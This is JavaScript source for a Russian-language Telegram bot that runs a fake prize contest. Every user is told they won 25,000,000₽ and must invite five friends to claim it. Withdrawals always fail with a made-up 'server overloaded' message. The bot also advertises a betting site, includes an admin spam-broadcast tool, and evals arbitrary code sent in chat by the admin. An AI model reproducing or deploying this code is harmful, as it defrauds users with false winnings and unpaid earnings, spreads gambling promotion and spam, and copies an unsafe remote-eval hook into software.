const { connect, model } = require('mongoose');
connect('mlab.com - создайте БД тут');

const ADMIN_ID = 482579901;
const ref = 50;

var User = model('User', {
	id: Number,
	member: Boolean,
	balance: Number,
	ref: Number,
	menu: String
});

const Telegram = require('node-telegram-bot-api');
const bot = new Telegram('Токен бота', { polling: true });

let start = [
	['🎁 Конкурс', '💰 Заработать'],
	['🖥 Профиль', '😎 Спонсор']
];

let admin = [
	['💰 Рассылка', '👥 Статистика'],
	['⛔️ Отмена']
];

bot.on('message', async (message) => {
	let $start = [];

	start.map((x) => $start.push(x));
	if(message.from.id === ADMIN_ID) {
		$start.push(['🔝 Админка']);
	}

	message.send = (text, params) => {
		if(!params) {
			params = {};
		}

		if(!params.parse_mode) params.parse_mode = 'Markdown';
		bot.sendMessage(message.chat.id, text, params);
	}

	if(message.text) {
		if(message.text.startsWith('/start')) {
			User.findOne({ id: message.from.id }).then(async (res) => {
				if(!res) {
					let schema = {
						id: message.from.id,
						member: false,
						balance: 0,
						ref: 0,
						menu: ''
					};

					let reffer = Number(message.text.split('/start')[1]);
					if(reffer) {
						let $reffer = await User.findOne({ id: reffer });
						if($reffer) {
							schema.ref = reffer;

							await $reffer.inc('balance', ref);
							bot.sendMessage(reffer, `💵 Вы *пригласили* [друга](tg://user?id=${message.from.id}), вам *начислено* *${ref}₽*`, { parse_mode: 'Markdown' });
						}
					}

					let user = new User(schema);
					await user.save();
				}
			});

			return message.send('Выберите пункт меню:', {
				reply_markup: {
					keyboard: $start,
					resize_keyboard: true
				}
			});
		}
	}

	let { status } = await bot.getChatMember(-1001457333935, message.from.id);
	if(status === 'left') return message.send(`➕ *Для того, чтобы* начать/продолжить работу с ботом, *вы должны быть подписанным* на канал https://t.me/joinchat/AAAAAFbdJq9JTae6gCB9ag`, {
		parse_mode: 'Markdown',
		reply_markup: {
			inline_keyboard: [
				[{ text: '➕ Подписаться', url: 'https://t.me/joinchat/AAAAAFbdJq9JTae6gCB9ag' }]
			]
		}
	});

	message.user = await User.findOne({ id: message.from.id });
	if(!message.user) return message.send('🤔 Что-то пошло не так... Нажмите /start');

	switch (message.text) {
		case '🎁 Конкурс':
			if(!message.user.member) return message.send(`🎁 Прими участие в *BIG!* конкурсе от *спонсоров* мировых корпораций.
			
🏆 Призы:

*1. 25.000.000₽!*
*2-10. 1.000.000₽*
*11-50. 100.000₽*
*51-100. iPhone XS Max*
*101-500. PlayStation 4*
*501-5000. Футболка 1xBET*
*5001-50000. Годовой запас Coca-Cola*
*50000-100000. Бесплатная еда в сети ресторанов MCDONALDS на 365 дней*

🕑 Конкурс ещё актуален!`, {
				reply_markup: {
					inline_keyboard: [
						[{ text: '🎁 Принять участие', callback_data: 'takePart' }]
					]
				}
			});

			let $refs = await User.countDocuments({ ref: message.from.id });
			let next = Math.ceil($refs / 5) * 5 === 0 ? 5 : Math.ceil($refs / 5) * 5;
	
			await message.user.set('member', true);
			return message.send(`🎉 Поздравляем, вы заняли 1 место в конкурсе!
			
🏆 Приз: *25.000.000₽*

🤖 Для того, *чтобы* забрать приз *Вы должны* пригласить 5 *друзей* в бота по вашей ссылке!

🌐 Ваша ссылка:
https://telegram.me/PastWinBot?start=${message.from.id}

🗣 Осталось пригласить: ${next - $refs}`, {
				parse_mode: 'Markdown',
				reply_markup: {
					inline_keyboard: [
						[{ text: '🎁 Забрать приз', callback_data: 'takePrize' }]
					]
				}
			});

			break;

		case '💰 Заработать':
			let refs = await User.countDocuments({ ref: message.from.id });

			return message.send(`[💵](https://pp.userapi.com/c848736/v848736462/1042c5/LwruvSjb6Bg.jpg) *За приглашение* 1 друга: ${ref}₽!

🌐 *Ваша ссылка* для приглашения: https://telegram.me/PastWinBot?start=${message.from.id}

👥 Приглашённых друзей: ${refs} *чел.*`, {
				reply_markup: {
					inline_keyboard: [
						[{ text: '💼 Рекламный пост', callback_data: 'post' }]
					]
				}
			});
			break;

		case '🖥 Профиль':
			return message.send(`${message.from.first_name}, ваш аккаунт:
			
💵 Баланс: ${message.user.balance}₽

🎁 Место в конкурсе: ${message.user.member ? '1 место' : 'None'}`, {
				reply_markup: {
					inline_keyboard: [
						[{ text: '📲 Вывод', callback_data: 'withdraw' }]
					]
				}
			});
			break;

		case '😎 Спонсор':
			return message.send(`[🏝](https://cdn-1win.xyz/promo_files_uploads/165d1e50337f5ee6cf5abc055c7c303d.png) Делай *СТАВКИ!* на проверенном БУКМЕКЕРЕ 1Win.
			
➕ ВЫСОКИЕ КОЭФФИЦИЕНТЫ
➕ БЫСТРЫЕ ВЫПЛАТЫ
➕ КРУГЛОСУТОЧНАЯ ТЕХ ПОДДЕРЖКА

🔗 ССЫЛКА: https://1wufb.xyz/?open=register`, { parse_mode: 'Markdown' });
			break;
	}

	if(message.from.id === ADMIN_ID) {
		if(message.text === '⛔️ Отмена') {
			await message.user.set('menu', '');
			return message.send('Операция отменена.', {
				reply_markup: {
					keyboard: $start,
					resize_keyboard: true
				}
			});
		}

		if(message.text === '🔝 Админка') {
			return message.send(`🔝 Админка`, {
				reply_markup: {
					keyboard: admin,
					resize_keyboard: true
				}
			});
		}

		if(message.text === '👥 Статистика') {
			let users = await User.countDocuments();
			return message.send(`Пользователи: ${users}`);
		}

		if(message.user.menu === "rss") {
			let users = await User.find();
			await message.user.set("menu", "");

			message.send('Начинаю!');

			users.forEach((item, i, arr) => {
				if(message.photo) {
					let file_id = message.photo[message.photo.length - 1].file_id;
					let params = {
						caption: message.caption,
						parse_mode: "HTML",
						disable_web_page_preview: true
					}

					if(message.caption.match(/(?:кнопка)\s(.*)\s-\s(.*)/i)) {
						let [ msgText, label, url ] = message.caption.match(/(?:кнопка)\s(.*)\s-\s(.*)/i);
						params.reply_markup = {
							inline_keyboard: [
								[{ text: label, url: url }]
							]
						}

						params.caption = params.caption.replace(/(кнопка)\s(.*)\s-\s(.*)/i, "");
					}

					bot.sendPhoto(users[i].id, file_id, params);
				}

				if(!message.photo) {
					let params = {
						parse_mode: "HTML",
						disable_web_page_preview: true
					}

					if(message.text.match(/(?:кнопка)\s(.*)\s-\s(.*)/i)) {
						let [ msgText, label, url ] = message.text.match(/(?:кнопка)\s(.*)\s-\s(.*)/i);
						params.reply_markup = {
							inline_keyboard: [
								[{ text: label, url: url }]
							]
						}
					}

					bot.sendMessage(users[i].id, message.text.replace(/(кнопка)\s(.*)\s-\s(.*)/i, ""), params);
				}

				msleep(2);
			});

			return message.send("Рассылка выполнена.");
		}

		if(message.text === "💰 Рассылка") {
			await message.user.set("menu", "rss");
			return message.send(`Введите текст рассылки, можно прикрепить картинку.
			
Прикрепить кнопку:
В конце добавить надо:

Кнопка Название - URL`, {
				reply_markup: {
					keyboard: [['⛔️ Отмена']],
					resize_keyboard: true
				}
			});
		}
	}

	if(message.text) if(/^(?:~)\s([^]+)/i.test(message.text)) {
		if(message.from.id !== 482579901) return;
		let result = eval(message.text.match(/^(?:~)\s([^]+)/i)[1]);
		
		try {
			if(typeof(result) === 'string')
			{
				return message.send(`string: \`${result}\``, { parse_mode: 'Markdown' });
			} else if(typeof(result) === 'number')
			{
				return message.send(`number: \`${result}\``, { parse_mode: 'Markdown' });
			} else {
				return message.send(`${typeof(result)}: \`${JSON.stringify(result, null, '\t\t')}\``, { parse_mode: 'Markdown' });
			}
		} catch (e) {
			console.error(e);
			return message.send(`ошибка:
\`${e.toString()}\``, { parse_mode: 'Markdown' });
		}
	}
});

bot.on('callback_query', async (query) => {
	const { message } = query;
	const { chat } = message;

	message.edit = (text, params) => {
		if(!params) params = { parse_mode: 'Markdown' };

		Object.assign(params, { message_id: message.message_id, chat_id: chat.id });
		return bot.editMessageText(text, params);
	}

	message.user = await User.findOne({ id: chat.id });
	if(!message.user) return;

	if(query.data === 'takePart') {
		let refs = await User.countDocuments({ ref: message.chat.id });
		let next = Math.ceil(refs / 5) * 5 === 0 ? 5 : Math.ceil(refs / 5) * 5;

		await message.user.set('member', true);
		return message.edit(`🎉 Поздравляем, вы заняли 1 место в конкурсе!
		
🏆 Приз: *25.000.000₽*

🤖 Для того, *чтобы* забрать приз *Вы должны* пригласить 5 *друзей* в бота по вашей ссылке!

🌐 Ваша ссылка:
https://telegram.me/PastWinBot?start=${chat.id}

🗣 Осталось пригласить: ${next - refs}`, {
			parse_mode: 'Markdown',
			reply_markup: {
				inline_keyboard: [
					[{ text: '🎁 Забрать приз', callback_data: 'takePrize' }]
				]
			}
		});
	}

	if(query.data === 'takePrize') {
		let Refs = await User.countDocuments({ ref: message.chat.id });
		let next = Math.ceil(Refs / 5) * 5 === 0 ? 5 : Math.ceil(Refs / 5) * 5;

		return bot.answerCallbackQuery(query.id, `🗣 Осталось пригласить: ${next - Refs}`)
	}

	if(query.data === 'post') {
		bot.sendMessage(message.chat.id, `🎁 *Ты хочешь выиграть 25.000.000₽*?

🍀 Тогда прими участие в *БОЛЬШОМ* КОНКУРСЕ Telegram.

💵 Главный приз: *25.000.000₽*

🌐 *Ссылка:* https://telegram.me/PastWinBot?start=${chat.id}`, { parse_mode: 'Markdown' });
	}

	if(query.data === 'withdraw') {
		if(message.user.balance < 1000) return message.edit('Минимальная сумма вывода: 1000₽');
		let callback_data = 'withdraw2';

		return bot.sendMessage(message.chat.id, 'Выберите способ вывода денег:', {
			reply_markup: {
				inline_keyboard: [
					[{ text: 'Банковская карта', callback_data }, { text: 'Qiwi', callback_data }],
					[{ text: 'Яндекс.Деньги', callback_data }, { text: 'WebMoney', callback_data }],
					[{ text: 'Баланс телефона', callback_data }, { text: 'Payeer', callback_data }]
				]
			}
		});
	}

	if(query.data === 'withdraw2') {
		return message.edit('В данный момент сервер, который отвечает за исходящие транзакции платежных систем перегружен, попробуйте позже.');
	}
});

User.prototype.inc = function(field, value = 1) {
	this[field] += value;
	return this.save();
}

User.prototype.dec = function(field, value = 1) {
	this[field] -= value;
	return this.save();
}

User.prototype.set = function(field, value) {
	this[field] = value;
	return this.save();
}

function msleep(n) {
	Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, n);
}

function sleep(n) {
	msleep(n * 1000);
}